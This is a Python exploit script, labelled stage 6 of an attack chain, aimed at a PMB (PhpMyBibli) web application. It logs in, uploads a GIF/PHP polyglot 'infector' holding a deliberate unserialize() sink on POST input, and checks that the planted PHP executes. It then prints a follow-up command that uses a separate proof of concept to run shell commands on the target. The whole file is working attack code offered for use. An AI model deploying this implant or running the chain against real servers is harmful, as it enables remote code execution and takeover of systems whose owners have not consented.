#!/usr/bin/env python3
"""Stage 6 — deploy the unserialize infector (remote_app.php).

Logs in, uploads the GIF/PHP polyglot, and verifies PHP execution.

Usage:
  python 05_deploy.py <user> <password> [filename]
"""
import sys

import common as c

sys.stdout.reconfigure(encoding="utf-8", errors="replace")

# The infector: valid GIF + CachedData gadget + unserialize sink
INFECTOR = c.GIF_1X1 + (
    b"<?php\n"
    b"class CachedData implements \\Serializable {\n"
    b"    public function serialize() { return ''; }\n"
    b"    public function unserialize($data) { unserialize($data); }\n"
    b"}\n"
    b"if (isset($_POST['cook'])) {\n"
    b"    $r = unserialize($_POST['cook']);\n"
    b"    echo serialize($r);\n"
    b"}\n"
)


def main(argv):
    if len(argv) < 2:
        c.out("usage: python 05_deploy.py <user> <password> [filename]")
        return 2
    user, password = argv[0], argv[1]
    filename = argv[2] if len(argv) > 2 else "remote_app.php"

    c.out("[*] login")
    cookies = c.login(user, password)
    if not cookies:
        c.out("[!] login failed")
        return 1
    c.out("    ok, SESSID %s" % cookies["PhpMyBibli-SESSID"])

    c.out("\n[*] upload infector %s" % filename)
    status, body = c.upload(cookies, filename, INFECTOR)
    c.out("    %s %s" % (status, body[:80]))
    if b'"status":1' not in body:
        c.out("[!] upload rejected")
        return 1

    path = "/pmb/" + filename
    c.out("\n[*] verify PHP execution")
    probe = b'cook=a:1:{i:0;s:11:"HELLO_World";}'
    import urllib.request
    req = urllib.request.Request(c.BASE + path, data=probe, headers={
        "User-Agent": c.UA, "Content-Type": "application/x-www-form-urlencoded"})
    try:
        with urllib.request.urlopen(req, timeout=20) as resp:
            echoed = resp.read()
    except Exception as exc:
        c.out("[!] probe failed: %s" % exc)
        return 1

    if b"HELLO_World" in echoed:
        c.out("    PHP executes (input echoed back)")
        c.out("\n[+] infector live: %s%s" % (c.BASE, path))
        c.out("\n    next: python pocket_poc.py --url %s%s --insecure --port 443 \"id>/dev/shm/x\""
              % (c.BASE, path))
        return 0
    c.out("[!] PHP did not execute")
    return 1


if __name__ == "__main__":
    raise SystemExit(main(sys.argv[1:]))
